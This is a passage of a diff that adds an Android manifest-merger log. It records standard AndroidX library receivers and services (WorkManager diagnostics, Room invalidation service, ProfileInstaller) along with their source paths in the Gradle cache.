+319-->[androidx.work:work-runtime:2.9.0] C:\Users\venci\.gradle\caches\transforms-3\d3e330e839df31ec59c25e4ac67a6f88\transformed\work-runtime-2.9.0\AndroidManifest.xml:139:13-141:29
+320                <action android:name="androidx.work.diagnostics.REQUEST_DIAGNOSTICS" />
+320-->[androidx.work:work-runtime:2.9.0] C:\Users\venci\.gradle\caches\transforms-3\d3e330e839df31ec59c25e4ac67a6f88\transformed\work-runtime-2.9.0\AndroidManifest.xml:140:17-88
+320-->[androidx.work:work-runtime:2.9.0] C:\Users\venci\.gradle\caches\transforms-3\d3e330e839df31ec59c25e4ac67a6f88\transformed\work-runtime-2.9.0\AndroidManifest.xml:140:25-85
+321            </intent-filter>
+322        </receiver>
+323
+324        <service
+324-->[androidx.room:room-runtime:2.5.0] C:\Users\venci\.gradle\caches\transforms-3\4e738ffa916343e5b453bfb62aaeb96c\transformed\room-runtime-2.5.0\AndroidManifest.xml:24:9-28:63
+325            android:name="androidx.room.MultiInstanceInvalidationService"
+325-->[androidx.room:room-runtime:2.5.0] C:\Users\venci\.gradle\caches\transforms-3\4e738ffa916343e5b453bfb62aaeb96c\transformed\room-runtime-2.5.0\AndroidManifest.xml:25:13-74
+326            android:directBootAware="true"
+326-->[androidx.room:room-runtime:2.5.0] C:\Users\venci\.gradle\caches\transforms-3\4e738ffa916343e5b453bfb62aaeb96c\transformed\room-runtime-2.5.0\AndroidManifest.xml:26:13-43
+327            android:exported="false" />
+327-->[androidx.room:room-runtime:2.5.0] C:\Users\venci\.gradle\caches\transforms-3\4e738ffa916343e5b453bfb62aaeb96c\transformed\room-runtime-2.5.0\AndroidManifest.xml:27:13-37
+328
+329        <receiver
+329-->[androidx.profileinstaller:profileinstaller:1.3.0] C:\Users\venci\.gradle\caches\transforms-3\78a0a8e2ee6a6f58e479b46914766cb1\transformed\profileinstaller-1.3.0\AndroidManifest.xml:34:9-52:20
+330            android:name="androidx.profileinstaller.ProfileInstallReceiver"
+330-->[androidx.profileinstaller:profileinstaller:1.3.0] C:\Users\venci\.gradle\caches\transforms-3\78a0a8e2ee6a6f58e479b46914766cb1\transformed\profileinstaller-1.3.0\AndroidManifest.xml:35:13-76
+331            android:directBootAware="false"
+331-->[androidx.profileinstaller:profileinstaller:1.3.0] C:\Users\venci\.gradle\caches\transforms-3\78a0a8e2ee6a6f58e479b46914766cb1\transformed\profileinstaller-1.3.0\AndroidManifest.xml:36:13-44
+332            android:enabled="true"
+332-->[androidx.profileinstaller:profileinstaller:1.3.0] C:\Users\venci\.gradle\caches\transforms-3\78a0a8e2ee6a6f58e479b46914766cb1\transformed\profileinstaller-1.3.0\AndroidManifest.xml:37:13-35
+333            android:exported="true"
+333-->[androidx.profileinstaller:profileinstaller:1.3.0] C:\Users\venci\.gradle\caches\transforms-3\78a0a8e2ee6a6f58e479b46914766cb1\transformed\profileinstaller-1.3.0\AndroidManifest.xml:38:13-36
+334            android:permission="android.permission.DUMP" >
+334-->[androidx.profileinstaller:profileinstaller:1.3.0] C:\Users\venci\.gradle\caches\transforms-3\78a0a8e2ee6a6f58e479b46914766cb1\transformed\profileinstaller-1.3.0\AndroidManifest.xml:39:13-57
+335            <intent-filter>
+335-->[androidx.profileinstaller:profileinstaller:1.3.0] C:\Users\venci\.gradle\caches\transforms-3\78a0a8e2ee6a6f58e479b46914766cb1\transformed\profileinstaller-1.3.0\AndroidManifest.xml:40:13-42:29
+336                <action android:name="androidx.profileinstaller.action.INSTALL_PROFILE" />
+336-->[androidx.profileinstaller:profileinstaller:1.3.0] C:\Users\venci\.gradle\caches\transforms-3\78a0a8e2ee6a6f58e479b46914766cb1\transformed\profileinstaller-1.3.0\AndroidManifest.xml:41:17-91
+336-->[androidx.profileinstaller:profileinstaller:1.3.0] C:\Users\venci\.gradle\caches\transforms-3\78a0a8e2ee6a6f58e479b46914766cb1\transformed\profileinstaller-1.3.0\AndroidManifest.xml:41:25-88
+337            </intent-filter>
+338            <intent-filter>
+338-->[androidx.profileinstaller:profileinstaller:1.3.0] C:\Users\venci\.gradle\caches\transforms-3\78a0a8e2ee6a6f58e479b46914766cb1\transformed\profileinstaller-1.3.0\AndroidManifest.xml:43:13-45:29
+339                <action android:name="androidx.profileinstaller.action.SKIP_FILE" />
+339-->[androidx.profileinstaller:profileinstaller:1.3.0] C:\Users\venci\.gradle\caches\transforms-3\78a0a8e2ee6a6f58e479b46914766cb1\transformed\profileinstaller-1.3.0\AndroidManifest.xml:44:17-85
+339-->[androidx.profileinstaller:profileinstaller:1.3.0] C:\Users\venci\.gradle\caches\transforms-3\78a0a8e2ee6a6f58e479b46914766cb1\transformed\profileinstaller-1.3.0\AndroidManifest.xml:44:25-82
+340            </intent-filter>
+341            <intent-filter>
+341-->[androidx.profileinstaller:profileinstaller:1.3.0] C:\Users\venci\.gradle\caches\transforms-3\78a0a8e2ee6a6f58e479b46914766cb1\transformed\profileinstaller-1.3.0\AndroidManifest.xml:46:13-48:29
+342                <action android:name="androidx.profileinstaller.action.SAVE_PROFILE" />
+342-->[androidx.profileinstaller:profileinstaller:1.3.0] C:\Users\venci\.gradle\caches\transforms-3\78a0a8e2ee6a6f58e479b46914766cb1\transformed\profileinstaller-1.3.0\AndroidManifest.xml:47:17-88
+342-->[androidx.profileinstaller:profileinstaller:1.3.0] C:\Users\venci\.gradle\caches\transforms-3\78a0a8e2ee6a6f58e479b46914766cb1\transformed\profileinstaller-1.3.0\AndroidManifest.xml:47:25-85
+343            </intent-filter>
+344            <intent-filter>
+344-->[androidx.profileinstaller:profileinstaller:1.3.0] C:\Users\venci\.gradle\caches\transforms-3\78a0a8e2ee6a6f58e479b46914766cb1\transformed\profileinstaller-1.3.0\AndroidManifest.xml:49:13-51:29
+345                <action android:name="androidx.profileinstaller.action.BENCHMARK_OPERATION" />
+345-->[androidx.profileinstaller:profileinstaller:1.3.0] C:\Users\venci\.gradle\caches\transforms-3\78a0a8e2ee6a6f58e479b46914766cb1\transformed\profileinstaller-1.3.0\AndroidManifest.xml:50:17-95
+345-->[androidx.profileinstaller:profileinstaller:1.3.0] C:\Users\venci\.gradle\caches\transforms-3\78a0a8e2ee6a6f58e479b46914766cb1\transformed\profileinstaller-1.3.0\AndroidManifest.xml:50:25-92
+346            </intent-filter>
+347        </receiver>
+348    </application>
+349
+350</manifest>
